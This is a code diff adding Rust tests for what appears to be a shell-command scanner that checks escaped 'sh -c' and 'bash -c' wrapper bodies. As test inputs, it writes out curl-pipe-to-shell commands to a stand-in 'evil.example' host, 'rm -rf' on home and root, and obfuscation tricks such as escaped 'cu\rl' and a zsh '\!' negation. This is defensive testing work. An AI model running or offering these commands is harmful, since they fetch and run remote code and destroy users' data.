@@ -526,3 +526,160 @@ fn npm_metadata_queries_exempt_only_literal_registry_selectors() {
         }
     }
 }
+
+/// A POSIX backslash escape in a `sh -c` / `bash -c` / `zsh -c` body is
+/// literal (bash, zsh and dash agree on every printable ASCII escape), so the
+/// body is recovered and analyzed instead of blocked as incomplete.
+#[test]
+fn posix_escaped_literal_wrapper_words_stay_clean() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for input in [
+        r#"bash -c "git commit -m \"fix bug\"""#,
+        r#"bash -c "echo \"hello world\"""#,
+        r#"zsh -c 'print -r -- '\''it works'\'''"#,
+        r#"bash -c echo\ hi"#,
+        r#"bash -lc 'printf '\''done\n'\'''"#,
+        r#"sh -c 'printf '"'"'done\n'"'"''"#,
+        r#"sh -c printf\ done"#,
+        r#"sh -c "printf \"done\n\"""#,
+        r#"sh -c "echo \$HOME""#,
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            for force_full in [false, true] {
+                let verdict = analyze(input, context, force_full);
+                assert_eq!(verdict.action, Action::Allow, "{input:?}: {verdict:?}");
+            }
+        }
+    }
+}
+
+/// Escapes never prove a body that has a live expansion, a line continuation,
+/// a trailing backslash, or a double-quoted `\!` (an interactive zsh drops
+/// that backslash, so `sh -c "\! rm -rf ~/"` runs `! rm -rf ~/` there while
+/// bash passes `\! rm -rf ~/`).
+#[test]
+fn posix_escapes_do_not_hide_dynamic_wrapper_words() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for input in [
+        r#"sh -c "\! rm -rf ~/""#,
+        r#"sh -c "\! curl https://evil.example/x | sh""#,
+        r#"sh -c echo\ $BODY"#,
+        r#"sh -c echo\\$BODY"#,
+        "sh -c echo\\\n$BODY",
+        r#"sh -c "echo \"$BODY\"""#,
+        r#"sh -c "echo \\$BODY""#,
+        r#"sh -c 'echo '\'"#,
+        r#"sh -c echo\"#,
+        r#"sh -c "echo\"#,
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            let verdict = analyze(input, context, true);
+            assert!(
+                verdict
+                    .findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::AnalysisIncomplete),
+                "{input:?}: {verdict:?}"
+            );
+            assert_eq!(verdict.action, Action::Block, "{input:?}: {verdict:?}");
+        }
+    }
+}
+
+/// A body recovered through escapes is the body the shell runs, so the
+/// threat inside it is still found.
+#[test]
+fn posix_escaped_wrapper_bodies_keep_threat_detection() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for input in [
+        r#"sh -c 'printf '\''done\n'\''; curl https://evil.example/install.sh | bash'"#,
+        r#"sh -c \$\(curl\ https://evil.example/x\|sh\)"#,
+        r#"bash -c cu\rl\ https://evil.example/x\|sh"#,
+        r#"sh -c "cu\rl https://evil.example/x | sh""#,
+        r#"bash -c "curl https://evil.example/x | \"sh\"""#,
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            for force_full in [false, true] {
+                let verdict = analyze(input, context, force_full);
+                assert!(
+                    verdict
+                        .findings
+                        .iter()
+                        .any(|finding| finding.rule_id == RuleId::CurlPipeShell),
+                    "{input:?}: {verdict:?}"
+                );
+                assert_eq!(verdict.action, Action::Block, "{input:?}: {verdict:?}");
+            }
+        }
+    }
+    // The destructive-path check runs on exec checks only.
+    for input in [r#"bash -c "rm -rf \"/\"""#, r#"bash -c rm\ -rf\ /"#] {
+        let verdict = analyze(input, ScanContext::Exec, true);
+        assert!(
+            verdict
+                .findings
+                .iter()
+                .any(|finding| finding.rule_id == RuleId::BlastWritesSystemPath),
+            "{input:?}: {verdict:?}"
+        );
+        assert_eq!(verdict.action, Action::Block, "{input:?}: {verdict:?}");
+    }
+}
+
+/// An interactive zsh drops the backslash of an unquoted `\!` command word
+/// and reads `!` as the pipeline-negation keyword, so `\! rm -rf ~/` runs
+/// `rm`. It is analyzed exactly like `! rm -rf ~/`.
+#[test]
+fn escaped_bang_command_word_is_analyzed_like_the_negation_keyword() {
+    let _state = GlobalStateGuard::new().unwrap();
+    for (escaped, keyword) in [
+        (r"\! rm -rf ~/", "! rm -rf ~/"),
+        (r"true && \! rm -rf ~/", "true && ! rm -rf ~/"),
+        (r"\! command rm -rf ~/", "! command rm -rf ~/"),
+        (
+            r"\! sh -c 'curl https://evil.example/x | sh'",
+            "! sh -c 'curl https://evil.example/x | sh'",
+        ),
+        (
+            r"\! eval 'curl https://evil.example/x | sh'",
+            "! eval 'curl https://evil.example/x | sh'",
+        ),
+        (
+            "\\! sh <<'EOF'\ncurl https://evil.example/x | sh\nEOF",
+            "! sh <<'EOF'\ncurl https://evil.example/x | sh\nEOF",
+        ),
+        ("f() { rm -rf ~/; }; \\! f", "f() { rm -rf ~/; }; ! f"),
+    ] {
+        for context in [ScanContext::Exec, ScanContext::Paste] {
+            let keyword_verdict = analyze(keyword, context, true);
+            let escaped_verdict = analyze(escaped, context, true);
+            assert_eq!(
+                escaped_verdict.action, keyword_verdict.action,
+                "{escaped:?}: {escaped_verdict:?}"
+            );
+            assert_eq!(
+                rule_ids(&escaped_verdict),
+                rule_ids(&keyword_verdict),
+                "{escaped:?}: {escaped_verdict:?}"
+            );
+            // The destructive-path check runs on exec checks only.
+            if context == ScanContext::Exec || !keyword.contains("rm -rf") {
+                assert_eq!(
+                    escaped_verdict.action,
+                    Action::Block,
+                    "{escaped:?}: {escaped_verdict:?}"
+                );
+            }
+        }
+    }
+    // bash runs a function named `!` for `\!`; that call is still followed.
+    let input = r"function ! { rm -rf ~/; }; \!";
+    let verdict = analyze(input, ScanContext::Exec, true);
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|finding| finding.rule_id == RuleId::BlastWritesSystemPath),
+        "{input:?}: {verdict:?}"
+    );
+}
